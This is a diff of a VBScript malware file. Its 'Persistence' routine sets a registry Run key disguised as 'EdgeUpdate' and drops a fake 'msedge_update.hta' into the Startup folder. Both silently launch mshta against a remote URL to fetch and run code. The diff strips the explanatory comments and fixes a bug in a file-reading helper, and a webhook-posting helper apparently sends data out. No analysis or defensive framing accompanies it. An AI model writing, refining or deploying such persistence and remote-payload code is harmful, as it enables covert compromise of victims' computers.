@@ -159,14 +159,10 @@ Sub Persistence()
     Dim payload : payload = "mshta https://dicerigx.app/"
     On Error Resume Next
     
-    ' Registry key to run the HTA on startup
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\EdgeUpdate", payload, "REG_SZ"
     
-    ' Drop an HTA file directly into the Startup folder
     Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\msedge_update.hta"
     Dim sf : Set sf = fso.CreateTextFile(sp, True)
-    
-    ' The HTA file just redirects to your main payload URL
     sf.WriteLine "<html><head><script language=""VBScript"">"
     sf.WriteLine "CreateObject(""WScript.Shell"").Run """ & payload & """, 0, False"
     sf.WriteLine "window.close()"
@@ -217,7 +213,7 @@ End Sub
 
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function ReadFile(path): ReadFile = "": Dim f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
 Sub PostEmbed(t, d, c)
     Call PostEmbedTo(t, d, c, WH)
